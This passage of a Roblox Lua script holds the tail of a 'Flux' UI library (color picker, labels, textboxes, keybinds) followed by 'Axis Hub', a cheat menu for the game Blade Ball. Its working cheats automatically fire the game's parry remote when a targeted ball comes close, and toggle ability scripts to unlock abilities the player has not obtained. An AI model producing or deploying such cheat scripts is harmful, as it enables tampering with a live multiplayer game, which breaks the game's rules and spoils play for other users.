            ColorSelection.Image = "http://www.roblox.com/asset/?id=4805639000"
            ColorSelection.ScaleType = Enum.ScaleType.Fit
            ColorSelection.Visible = false

            Toggle.Name = "Toggle"
            Toggle.Parent = Title
            Toggle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Toggle.BackgroundTransparency = 1.000
            Toggle.Position = UDim2.new(2.37430048, 0, 1.07157099, 0)
            Toggle.Size = UDim2.new(0, 137, 0, 38)
            Toggle.Font = Enum.Font.Gotham
            Toggle.Text = "Rainbow"
            Toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
            Toggle.TextSize = 15.000
            Toggle.TextTransparency = 0.300
            Toggle.TextXAlignment = Enum.TextXAlignment.Left

            ToggleFrame.Name = "ToggleFrame"
            ToggleFrame.Parent = Toggle
            ToggleFrame.BackgroundColor3 = Color3.fromRGB(226, 227, 227)
            ToggleFrame.Position = UDim2.new(0.778387249, 0, 0.357142866, 0)
            ToggleFrame.Size = UDim2.new(0, 27, 0, 11)

            ToggleFrameCorner.Name = "ToggleFrameCorner"
            ToggleFrameCorner.Parent = ToggleFrame

            ToggleCircle.Name = "ToggleCircle"
            ToggleCircle.Parent = ToggleFrame
            ToggleCircle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            ToggleCircle.Position = UDim2.new(0, 0, -0.273000002, 0)
            ToggleCircle.Selectable = true
            ToggleCircle.Size = UDim2.new(0, 17, 0, 17)

            ToggleCircleCorner.CornerRadius = UDim.new(2, 8)
            ToggleCircleCorner.Name = "ToggleCircleCorner"
            ToggleCircleCorner.Parent = ToggleCircle

            Confirm.Name = "Confirm"
            Confirm.Parent = Title
            Confirm.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            Confirm.ClipsDescendants = true
            Confirm.Position = UDim2.new(2.3791616, 0, 1.97633278, 0)
            Confirm.Size = UDim2.new(0, 144, 0, 42)
            Confirm.AutoButtonColor = false
            Confirm.Font = Enum.Font.SourceSans
            Confirm.Text = ""
            Confirm.TextColor3 = Color3.fromRGB(0, 0, 0)
            Confirm.TextSize = 14.000

            ConfirmCorner.CornerRadius = UDim.new(0, 4)
            ConfirmCorner.Name = "ConfirmCorner"
            ConfirmCorner.Parent = Confirm

            ConfirmTitle.Name = "ConfirmTitle"
            ConfirmTitle.Parent = Confirm
            ConfirmTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            ConfirmTitle.BackgroundTransparency = 1.000
            ConfirmTitle.Size = UDim2.new(0, 116, 0, 40)
            ConfirmTitle.Font = Enum.Font.Gotham
            ConfirmTitle.Text = "Confirm"
            ConfirmTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
            ConfirmTitle.TextSize = 15.000
            ConfirmTitle.TextTransparency = 0.300
            ConfirmTitle.TextXAlignment = Enum.TextXAlignment.Left

            BoxColor.Name = "BoxColor"
            BoxColor.Parent = Title
            BoxColor.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            BoxColor.Position = UDim2.new(3.26915574, 0, 0.261904776, 0)
            BoxColor.Size = UDim2.new(0, 35, 0, 19)

            BoxColorCorner.CornerRadius = UDim.new(0, 4)
            BoxColorCorner.Name = "BoxColorCorner"
            BoxColorCorner.Parent = BoxColor

            ToggleBtn.Name = "ToggleBtn"
            ToggleBtn.Parent = Toggle
            ToggleBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            ToggleBtn.BackgroundTransparency = 1.000
            ToggleBtn.Size = UDim2.new(0, 137, 0, 38)
            ToggleBtn.Font = Enum.Font.SourceSans
            ToggleBtn.Text = ""
            ToggleBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
            ToggleBtn.TextSize = 14.000

            ColorpickerBtn.MouseEnter:Connect(function()
                TweenService:Create(
                    Title,
                    TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                    {TextTransparency = 0}
                ):Play()
            end)

            ColorpickerBtn.MouseLeave:Connect(function()
                TweenService:Create(
                    Title,
                    TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                    {TextTransparency = 0.3}
                ):Play()
            end)

            ColorpickerBtn.MouseButton1Click:Connect(function()
                if ColorPickerToggled == false then
                    ColorSelection.Visible = true
                    HueSelection.Visible = true
                    Colorpicker:TweenSize(UDim2.new(0, 457, 0, 138), Enum.EasingDirection.Out, Enum.EasingStyle.Quart, .6, true)
                    TweenService:Create(
                        Title,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {TextColor3 = PresetColor}
                    ):Play()
                    TweenService:Create(
                        Circle,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {BackgroundColor3 = PresetColor}
                    ):Play()
                    TweenService:Create(
                        CircleSmall,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {BackgroundTransparency = 0}
                    ):Play()
                    TweenService:Create(
                        Title,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {TextTransparency = 0}
                    ):Play()
                    wait(.4)
                    Container.CanvasSize = UDim2.new(0, 0, 0, ContainerLayout.AbsoluteContentSize.Y)
                else
                    ColorSelection.Visible = false
                    HueSelection.Visible = false
                    Colorpicker:TweenSize(UDim2.new(0, 457, 0, 43), Enum.EasingDirection.Out, Enum.EasingStyle.Quart, .6, true)
                    TweenService:Create(
                        Title,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {TextColor3 = Color3.fromRGB(255,255,255)}
                    ):Play()
                    TweenService:Create(
                        Circle,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {BackgroundColor3 = Color3.fromRGB(211, 211, 211)}
                    ):Play()
                    TweenService:Create(
                        CircleSmall,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {BackgroundTransparency = 1}
                    ):Play()
                    TweenService:Create(
                        Title,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {TextTransparency = 0.3}
                    ):Play()
                    wait(.4)
                    Container.CanvasSize = UDim2.new(0, 0, 0, ContainerLayout.AbsoluteContentSize.Y)
                end
                ColorPickerToggled = not ColorPickerToggled
            end)


            local function UpdateColorPicker(nope)
                BoxColor.BackgroundColor3 = Color3.fromHSV(ColorH, ColorS, ColorV)
                Color.BackgroundColor3 = Color3.fromHSV(ColorH, 1, 1)

                pcall(callback, BoxColor.BackgroundColor3)
            end

            ColorH =
                1 -
                (math.clamp(HueSelection.AbsolutePosition.Y - Hue.AbsolutePosition.Y, 0, Hue.AbsoluteSize.Y) /
                    Hue.AbsoluteSize.Y)
            ColorS =
                (math.clamp(ColorSelection.AbsolutePosition.X - Color.AbsolutePosition.X, 0, Color.AbsoluteSize.X) /
                    Color.AbsoluteSize.X)
            ColorV =
                1 -
                (math.clamp(ColorSelection.AbsolutePosition.Y - Color.AbsolutePosition.Y, 0, Color.AbsoluteSize.Y) /
                    Color.AbsoluteSize.Y)

            BoxColor.BackgroundColor3 = preset
            Color.BackgroundColor3 = preset
            pcall(callback, BoxColor.BackgroundColor3)

            Color.InputBegan:Connect(
                function(input)
                    if input.UserInputType == Enum.UserInputType.MouseButton1 then
                        if RainbowColorPicker then
                            return
                        end

                        if ColorInput then
                            ColorInput:Disconnect()
                        end

                        ColorInput =
                            RunService.RenderStepped:Connect(
                                function()
                                local ColorX =
                                    (math.clamp(Mouse.X - Color.AbsolutePosition.X, 0, Color.AbsoluteSize.X) /
                                        Color.AbsoluteSize.X)
                                local ColorY =
                                    (math.clamp(Mouse.Y - Color.AbsolutePosition.Y, 0, Color.AbsoluteSize.Y) /
                                        Color.AbsoluteSize.Y)

                                ColorSelection.Position = UDim2.new(ColorX, 0, ColorY, 0)
                                ColorS = ColorX
                                ColorV = 1 - ColorY

                                UpdateColorPicker(true)
                            end
                            )
                    end
                end
            )

            Color.InputEnded:Connect(
                function(input)
                    if input.UserInputType == Enum.UserInputType.MouseButton1 then
                        if ColorInput then
                            ColorInput:Disconnect()
                        end
                    end
                end
            )

            Hue.InputBegan:Connect(
                function(input)
                    if input.UserInputType == Enum.UserInputType.MouseButton1 then
                        if RainbowColorPicker then
                            return
                        end

                        if HueInput then
                            HueInput:Disconnect()
                        end

                        HueInput =
                            RunService.RenderStepped:Connect(
                                function()
                                local HueY =
                                    (math.clamp(Mouse.Y - Hue.AbsolutePosition.Y, 0, Hue.AbsoluteSize.Y) /
                                        Hue.AbsoluteSize.Y)

                                HueSelection.Position = UDim2.new(0.48, 0, HueY, 0)
                                ColorH = 1 - HueY

                                UpdateColorPicker(true)
                            end
                            )
                    end
                end
            )

            Hue.InputEnded:Connect(
                function(input)
                    if input.UserInputType == Enum.UserInputType.MouseButton1 then
                        if HueInput then
                            HueInput:Disconnect()
                        end
                    end
                end
            )

            ToggleBtn.MouseButton1Down:Connect(
                function()
                    RainbowColorPicker = not RainbowColorPicker

                    if ColorInput then
                        ColorInput:Disconnect()
                    end

                    if HueInput then
                        HueInput:Disconnect()
                    end

                    if RainbowColorPicker then
                        ToggleCircle:TweenPosition(UDim2.new(0.37, 0,-0.273, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quart, .3, true)
                        TweenService:Create(
                            ToggleCircle,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundColor3 =PresetColor}
                        ):Play()

                        OldToggleColor = BoxColor.BackgroundColor3
                        OldColor = Color.BackgroundColor3
                        OldColorSelectionPosition = ColorSelection.Position
                        OldHueSelectionPosition = HueSelection.Position

                        while RainbowColorPicker do
                            BoxColor.BackgroundColor3 = Color3.fromHSV(Flux.RainbowColorValue, 1, 1)
                            Color.BackgroundColor3 = Color3.fromHSV(Flux.RainbowColorValue, 1, 1)

                            ColorSelection.Position = UDim2.new(1, 0, 0, 0)
                            HueSelection.Position = UDim2.new(0.48, 0, 0, Flux.HueSelectionPosition)

                            pcall(callback, BoxColor.BackgroundColor3)
                            wait()
                        end
                    elseif not RainbowColorPicker then
                        ToggleCircle:TweenPosition(UDim2.new(0, 0,-0.273, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quart, .3, true)
                        TweenService:Create(
                            ToggleCircle,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundColor3 = Color3.fromRGB(255,255,255)}
                        ):Play()

                        BoxColor.BackgroundColor3 = OldToggleColor
                        Color.BackgroundColor3 = OldColor

                        ColorSelection.Position = OldColorSelectionPosition
                        HueSelection.Position = OldHueSelectionPosition

                        pcall(callback, BoxColor.BackgroundColor3)
                    end
                end
            )

            Confirm.MouseButton1Click:Connect(
                function()
                    ColorPickerToggled = not ColorPickerToggled
                    Colorpicker:TweenSize(UDim2.new(0, 457, 0, 43), Enum.EasingDirection.Out, Enum.EasingStyle.Quart, .6, true)
                    TweenService:Create(
                        Title,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {TextColor3 = Color3.fromRGB(255,255,255)}
                    ):Play()
                    TweenService:Create(
                        Circle,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {BackgroundColor3 = Color3.fromRGB(211, 211, 211)}
                    ):Play()
                    TweenService:Create(
                        CircleSmall,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {BackgroundTransparency = 1}
                    ):Play()
                    TweenService:Create(
                        Title,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {TextTransparency = 0.3}
                    ):Play()
                    wait(.4)
                    Container.CanvasSize = UDim2.new(0, 0, 0, ContainerLayout.AbsoluteContentSize.Y)
                end
            )
            Container.CanvasSize = UDim2.new(0, 0, 0, ContainerLayout.AbsoluteContentSize.Y)
        end
        function ContainerContent:Line()
            local Line = Instance.new("TextButton")
            local LineCorner = Instance.new("UICorner")

            Line.Name = "Line"
            Line.Parent = Container
            Line.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            Line.ClipsDescendants = true
            Line.Position = UDim2.new(0, 0, 0.70091325, 0)
            Line.Size = UDim2.new(0, 457, 0, 4)
            Line.AutoButtonColor = false
            Line.Font = Enum.Font.SourceSans
            Line.Text = ""
            Line.TextColor3 = Color3.fromRGB(0, 0, 0)
            Line.TextSize = 14.000

            LineCorner.CornerRadius = UDim.new(0, 4)
            LineCorner.Name = "LineCorner"
            LineCorner.Parent = Line

            Container.CanvasSize = UDim2.new(0, 0, 0, ContainerLayout.AbsoluteContentSize.Y)
        end
        function ContainerContent:Label(text)
            local labelfunc = {}
            local Label = Instance.new("TextButton")
            local LabelCorner = Instance.new("UICorner")
            local Title = Instance.new("TextLabel")

            Label.Name = "Label"
            Label.Parent = Container
            Label.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            Label.ClipsDescendants = true
            Label.Position = UDim2.new(0.370312512, 0, 0.552631557, 0)
            Label.Size = UDim2.new(0, 457, 0, 43)
            Label.AutoButtonColor = false
            Label.Font = Enum.Font.SourceSans
            Label.Text = ""
            Label.TextColor3 = Color3.fromRGB(0, 0, 0)
            Label.TextSize = 14.000

            LabelCorner.CornerRadius = UDim.new(0, 4)
            LabelCorner.Name = "LabelCorner"
            LabelCorner.Parent = Label

            Title.Name = "Title"
            Title.Parent = Label
            Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Title.BackgroundTransparency = 1.000
            Title.Position = UDim2.new(0.038480062, 0, 0, 0)
            Title.Size = UDim2.new(0, 113, 0, 42)
            Title.Font = Enum.Font.Gotham
            Title.Text = text
            Title.TextColor3 = Color3.fromRGB(255, 255, 255)
            Title.TextSize = 15.000
            Title.TextTransparency = 0.300
            Title.TextXAlignment = Enum.TextXAlignment.Left

            Container.CanvasSize = UDim2.new(0, 0, 0, ContainerLayout.AbsoluteContentSize.Y)
            function labelfunc:Refresh(tochange)
                Title.Text = tochange
            end
            return labelfunc
        end
        function ContainerContent:Textbox(text,desc,disapper,callback)
            if desc == "" then
                desc = "There is no description for this textbox."
            end
            local TextboxDescToggled = false
            local Textbox = Instance.new("TextButton")
            local TextboxCorner = Instance.new("UICorner")
            local Title = Instance.new("TextLabel")
            local Circle = Instance.new("Frame")
            local CircleCorner = Instance.new("UICorner")
            local CircleSmall = Instance.new("Frame")
            local CircleSmallCorner = Instance.new("UICorner")
            local Description = Instance.new("TextLabel")
            local TextboxFrame = Instance.new("Frame")
            local TextboxFrameCorner = Instance.new("UICorner")
            local TextBox = Instance.new("TextBox")

            Textbox.Name = "Textbox"
            Textbox.Parent = Container
            Textbox.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            Textbox.ClipsDescendants = true
            Textbox.Position = UDim2.new(0.0459499061, 0, 0.734449744, 0)
            Textbox.Size = UDim2.new(0, 457, 0, 43)
            Textbox.AutoButtonColor = false
            Textbox.Font = Enum.Font.SourceSans
            Textbox.Text = ""
            Textbox.TextColor3 = Color3.fromRGB(0, 0, 0)
            Textbox.TextSize = 14.000

            TextboxCorner.CornerRadius = UDim.new(0, 4)
            TextboxCorner.Name = "TextboxCorner"
            TextboxCorner.Parent = Textbox

            Title.Name = "Title"
            Title.Parent = Textbox
            Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Title.BackgroundTransparency = 1.000
            Title.Position = UDim2.new(0.0822437406, 0, 0, 0)
            Title.Size = UDim2.new(0, 113, 0, 42)
            Title.Font = Enum.Font.Gotham
            Title.Text = text
            Title.TextColor3 = Color3.fromRGB(255, 255, 255)
            Title.TextSize = 15.000
            Title.TextTransparency = 0.300
            Title.TextXAlignment = Enum.TextXAlignment.Left

            Circle.Name = "Circle"
            Circle.Parent = Title
            Circle.Active = true
            Circle.AnchorPoint = Vector2.new(0.5, 0.5)
            Circle.BackgroundColor3 = Color3.fromRGB(211, 211, 211)
            Circle.Position = UDim2.new(-0.150690272, 0, 0.503000021, 0)
            Circle.Size = UDim2.new(0, 11, 0, 11)

            CircleCorner.CornerRadius = UDim.new(2, 6)
            CircleCorner.Name = "CircleCorner"
            CircleCorner.Parent = Circle

            CircleSmall.Name = "CircleSmall"
            CircleSmall.Parent = Circle
            CircleSmall.Active = true
            CircleSmall.AnchorPoint = Vector2.new(0.5, 0.5)
            CircleSmall.BackgroundColor3 = Color3.fromRGB(64, 68, 75)
            CircleSmall.BackgroundTransparency = 1.000
            CircleSmall.Position = UDim2.new(0.485673368, 0, 0.503000021, 0)
            CircleSmall.Size = UDim2.new(0, 9, 0, 9)

            CircleSmallCorner.CornerRadius = UDim.new(2, 6)
            CircleSmallCorner.Name = "CircleSmallCorner"
            CircleSmallCorner.Parent = CircleSmall

            Description.Name = "Description"
            Description.Parent = Title
            Description.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Description.BackgroundTransparency = 1.000
            Description.Position = UDim2.new(-0.200942323, 0, 0.985714269, 0)
            Description.Size = UDim2.new(0, 432, 0, 31)
            Description.Font = Enum.Font.Gotham
            Description.Text = desc
            Description.TextColor3 = Color3.fromRGB(255, 255, 255)
            Description.TextSize = 15.000
            Description.TextTransparency = 1
            Description.TextWrapped = true
            Description.TextXAlignment = Enum.TextXAlignment.Left

            TextboxFrame.Name = "TextboxFrame"
            TextboxFrame.Parent = Title
            TextboxFrame.BackgroundColor3 = Color3.fromRGB(50, 53, 59)
            TextboxFrame.Position = UDim2.new(1.82300889, 0, 0.202380955, 0)
            TextboxFrame.Size = UDim2.new(0, 161, 0, 26)

            TextboxFrameCorner.CornerRadius = UDim.new(0, 4)
            TextboxFrameCorner.Name = "TextboxFrameCorner"
            TextboxFrameCorner.Parent = TextboxFrame

            TextBox.Parent = TextboxFrame
            TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextBox.BackgroundTransparency = 1.000
            TextBox.Size = UDim2.new(0, 161, 0, 26)
            TextBox.Font = Enum.Font.Gotham
            TextBox.Text = ""
            TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextBox.TextSize = 15.000
            TextBox.TextTransparency = 0.300

            TextBox.FocusLost:Connect(
                function(ep)
                    if ep then
                        if #TextBox.Text > 0 then
                            pcall(callback, TextBox.Text)
                            if disapper then
                                TextBox.Text = ""
                            end
                        end
                    end
                end
            )
            Container.CanvasSize = UDim2.new(0, 0, 0, ContainerLayout.AbsoluteContentSize.Y)
        end
        function ContainerContent:Bind(text,presetbind,callback)
            local Key = presetbind.Name
            local Bind = Instance.new("TextButton")
            local BindCorner = Instance.new("UICorner")
            local Title = Instance.new("TextLabel")
            local Circle = Instance.new("Frame")
            local CircleCorner = Instance.new("UICorner")
            local CircleSmall = Instance.new("Frame")
            local CircleSmallCorner = Instance.new("UICorner")
            local BindLabel = Instance.new("TextLabel")

            Bind.Name = "Bind"
            Bind.Parent = Container
            Bind.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            Bind.ClipsDescendants = true
            Bind.Position = UDim2.new(0.40625, 0, 0.828947306, 0)
            Bind.Size = UDim2.new(0, 457, 0, 43)
            Bind.AutoButtonColor = false
            Bind.Font = Enum.Font.SourceSans
            Bind.Text = ""
            Bind.TextColor3 = Color3.fromRGB(0, 0, 0)
            Bind.TextSize = 14.000

            BindCorner.CornerRadius = UDim.new(0, 4)
            BindCorner.Name = "BindCorner"
            BindCorner.Parent = Bind

            Title.Name = "Title"
            Title.Parent = Bind
            Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Title.BackgroundTransparency = 1.000
            Title.Position = UDim2.new(0.0822437406, 0, 0, 0)
            Title.Size = UDim2.new(0, 113, 0, 42)
            Title.Font = Enum.Font.Gotham
            Title.Text = text
            Title.TextColor3 = Color3.fromRGB(255, 255, 255)
            Title.TextSize = 15.000
            Title.TextTransparency = 0.300
            Title.TextXAlignment = Enum.TextXAlignment.Left

            Circle.Name = "Circle"
            Circle.Parent = Title
            Circle.Active = true
            Circle.AnchorPoint = Vector2.new(0.5, 0.5)
            Circle.BackgroundColor3 = Color3.fromRGB(211, 211, 211)
            Circle.Position = UDim2.new(-0.150690272, 0, 0.503000021, 0)
            Circle.Size = UDim2.new(0, 11, 0, 11)

            CircleCorner.CornerRadius = UDim.new(2, 6)
            CircleCorner.Name = "CircleCorner"
            CircleCorner.Parent = Circle

            CircleSmall.Name = "CircleSmall"
            CircleSmall.Parent = Circle
            CircleSmall.Active = true
            CircleSmall.AnchorPoint = Vector2.new(0.5, 0.5)
            CircleSmall.BackgroundColor3 = Color3.fromRGB(64, 68, 75)
            CircleSmall.BackgroundTransparency = 1.000
            CircleSmall.Position = UDim2.new(0.485673368, 0, 0.503000021, 0)
            CircleSmall.Size = UDim2.new(0, 9, 0, 9)

            CircleSmallCorner.CornerRadius = UDim.new(2, 6)
            CircleSmallCorner.Name = "CircleSmallCorner"
            CircleSmallCorner.Parent = CircleSmall

            BindLabel.Name = "BindLabel"
            BindLabel.Parent = Title
            BindLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            BindLabel.BackgroundTransparency = 1.000
            BindLabel.Position = UDim2.new(2.56011987, 0, 0, 0)
            BindLabel.Size = UDim2.new(0, 113, 0, 42)
            BindLabel.Font = Enum.Font.Gotham
            BindLabel.Text = Key
            BindLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
            BindLabel.TextSize = 15.000
            BindLabel.TextTransparency = 0.300
            BindLabel.TextXAlignment = Enum.TextXAlignment.Right

            Bind.MouseEnter:Connect(function()
                TweenService:Create(
                    Title,
                    TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                    {TextTransparency = 0}
                ):Play()
            end)

            Bind.MouseLeave:Connect(function()
                TweenService:Create(
                    Title,
                    TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                    {TextTransparency = 0.3}
                ):Play()
            end)

            Bind.MouseButton1Click:connect(
                function()
                    TweenService:Create(
                        Title,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {TextColor3 = PresetColor}
                    ):Play()
                    TweenService:Create(
                        BindLabel,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {TextColor3 = PresetColor}
                    ):Play()
                    TweenService:Create(
                        Circle,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {BackgroundColor3 = PresetColor}
                    ):Play()
                    TweenService:Create(
                        CircleSmall,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {BackgroundTransparency = 0}
                    ):Play()
                    TweenService:Create(
                        Title,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {TextTransparency = 0}
                    ):Play()
                    TweenService:Create(
                        BindLabel,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {TextTransparency = 0}
                    ):Play()
                    BindLabel.Text = "..."
                    local inputwait = game:GetService("UserInputService").InputBegan:wait()
                    if inputwait.KeyCode.Name ~= "Unknown" then
                        BindLabel.Text = inputwait .KeyCode.Name
                        Key = inputwait .KeyCode.Name
                    end
                    TweenService:Create(
                        Title,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {TextColor3 = Color3.fromRGB(255,255,255)}
                    ):Play()
                    TweenService:Create(
                        BindLabel,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {TextColor3 = Color3.fromRGB(255,255,255)}
                    ):Play()
                    TweenService:Create(
                        Circle,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {BackgroundColor3 = Color3.fromRGB(211, 211, 211)}
                    ):Play()
                    TweenService:Create(
                        CircleSmall,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {BackgroundTransparency = 1}
                    ):Play()
                    TweenService:Create(
                        Title,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {TextTransparency = 0.3}
                    ):Play()
                    TweenService:Create(
                        BindLabel,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {TextTransparency = 0.3}
                    ):Play()
                end
            )

            game:GetService("UserInputService").InputBegan:connect(
            function(current, pressed)
                if not pressed then
                    if current.KeyCode.Name == Key then
                        pcall(callback)
                    end
                end
            end
            )

            Container.CanvasSize = UDim2.new(0, 0, 0, ContainerLayout.AbsoluteContentSize.Y)
        end
        return ContainerContent
    end
    return Tabs
    end
        local win = Flux:Window("Axis Hub", "Blade Ball", Color3.fromRGB(0, 254, 252 ), Enum.KeyCode.RightControl)
                 
                 Flux:Notification("Axis Hub: Blade Ball","Ok")
        local page1 = win:Tab("Main", "http://www.roblox.com/asset/?id=9391995844")
        local page2 = win:Tab("Mics", "http://www.roblox.com/asset/?id=9391995844")
        local page4 = win:Tab("Rejoin/Hop", "http://www.roblox.com/asset/?id=9391995844")
       local page5 = win:Tab("Credit", "http://www.roblox.com/asset/?id=9391995844")
        page1:Label("Auto Parry")
   



        page1:Slider("Change Distance", 1, 100, getgenv().Dis, function(number)
            getgenv().Dis = number
            saveSetting()
        end)
        


        page1:Toggle("Enable Auto Parry", _G.hehe, function(bool)
            _G.hehe = bool
            _G.parry = getgenv().Dis
            if _G.hehe then
                local LocalPlayer = game:GetService("Players").LocalPlayer
        
                game:GetService("Workspace").Balls.ChildAdded:Connect(function(child)
                    local trackTask = task.spawn(function()
                        local ball = child
                        while task.wait() do
                            if string.find(ball.BrickColor.Name:lower(), "red") then
                                while LocalPlayer:DistanceFromCharacter(ball.Position) > _G.parry do
                                    task.wait()
                                end
        
                                local ReplicatedStorage = game:GetService("ReplicatedStorage")
                                ReplicatedStorage.Remotes.ParryButtonPress:Fire()
                            end
                        end
                    end)
                    child.Destroying:Connect(function()
                        task.cancel(trackTask)
                    end)
                end)
            else
                _G.parry = 0
                
            end
            saveSetting()
        end)
        
        page1:Toggle("Legit Auto Parry(OP)", getgenv().auto, function(t)
            getgenv().auto = t
            saveSetting()
        end)
        




   page1:Label("Get Ability")

page1:Button("Get Dash", function()
game.Players.LocalPlayer.Character.Abilities.Dash.Disabled = false
game.Players.LocalPlayer.Character.Abilities.Forcefield.Disabled = true
game.Players.LocalPlayer.Character.Abilities.Invisibility.Disabled = true
game.Players.LocalPlayer.Character.Abilities.Platform.Disabled = true
game.Players.LocalPlayer.Character.Abilities["Raging Deflection"].Disabled = true
game.Players.LocalPlayer.Character.Abilities["Shadow Step"].Disabled = true
game.Players.LocalPlayer.Character.Abilities["Super Jump"].Disabled = true
game.Players.LocalPlayer.Character.Abilities.Telekinesis.Disabled = true
game.Players.LocalPlayer.Character.Abilities["Thunder Dash"].Disabled = true
game.Players.LocalPlayer.Character.Abilities.Rapture.Disabled = true
game.Players.LocalPlayer.Character.Abilities["Phase Bypass"].Disabled = true
game.Players.LocalPlayer.Character.Abilities["Wind Cloak"].Disabled = true
end)


page1:Button("Get Forcefield", function(t)
game.Players.LocalPlayer.Character.Abilities.Dash.Disabled = true
game.Players.LocalPlayer.Character.Abilities.Forcefield.Disabled = false
game.Players.LocalPlayer.Character.Abilities.Invisibility.Disabled = true
game.Players.LocalPlayer.Character.Abilities.Platform.Disabled = true
game.Players.LocalPlayer.Character.Abilities["Raging Deflection"].Disabled = true
game.Players.LocalPlayer.Character.Abilities["Shadow Step"].Disabled = true
game.Players.LocalPlayer.Character.Abilities["Super Jump"].Disabled = true
game.Players.LocalPlayer.Character.Abilities.Telekinesis.Disabled = true
game.Players.LocalPlayer.Character.Abilities["Thunder Dash"].Disabled = true
game.Players.LocalPlayer.Character.Abilities.Rapture.Disabled = true
game.Players.LocalPlayer.Character.Abilities["Phase Bypass"].Disabled = true
game.Players.LocalPlayer.Character.Abilities["Wind Cloak"].Disabled = true
end)

page1:Button("Get Invisibility", function(t)
game.Players.LocalPlayer.Character.Abilities.Dash.Disabled = true
game.Players.LocalPlayer.Character.Abilities.Forcefield.Disabled = true
game.Players.LocalPlayer.Character.Abilities.Invisibility.Disabled = false
game.Players.LocalPlayer.Character.Abilities.Platform.Disabled = true
game.Players.LocalPlayer.Character.Abilities["Raging Deflection"].Disabled = true
game.Players.LocalPlayer.Character.Abilities["Shadow Step"].Disabled = true
game.Players.LocalPlayer.Character.Abilities["Super Jump"].Disabled = true
game.Players.LocalPlayer.Character.Abilities.Telekinesis.Disabled = true
game.Players.LocalPlayer.Character.Abilities["Thunder Dash"].Disabled = true
game.Players.LocalPlayer.Character.Abilities.Rapture.Disabled = true
game.Players.LocalPlayer.Character.Abilities["Phase Bypass"].Disabled = true
game.Players.LocalPlayer.Character.Abilities["Wind Cloak"].Disabled = true
end)

page1:Button("Get Platform", function(t)
game.Players.LocalPlayer.Character.Abilities.Dash.Disabled = true
game.Players.LocalPlayer.Character.Abilities.Forcefield.Disabled = true
game.Players.LocalPlayer.Character.Abilities.Invisibility.Disabled = true
game.Players.LocalPlayer.Character.Abilities.Platform.Disabled = false
game.Players.LocalPlayer.Character.Abilities["Raging Deflection"].Disabled = true
game.Players.LocalPlayer.Character.Abilities["Shadow Step"].Disabled = true
game.Players.LocalPlayer.Character.Abilities["Super Jump"].Disabled = true
game.Players.LocalPlayer.Character.Abilities.Telekinesis.Disabled = true
game.Players.LocalPlayer.Character.Abilities["Thunder Dash"].Disabled = true
game.Players.LocalPlayer.Character.Abilities.Rapture.Disabled = true
game.Players.LocalPlayer.Character.Abilities["Phase Bypass"].Disabled = true
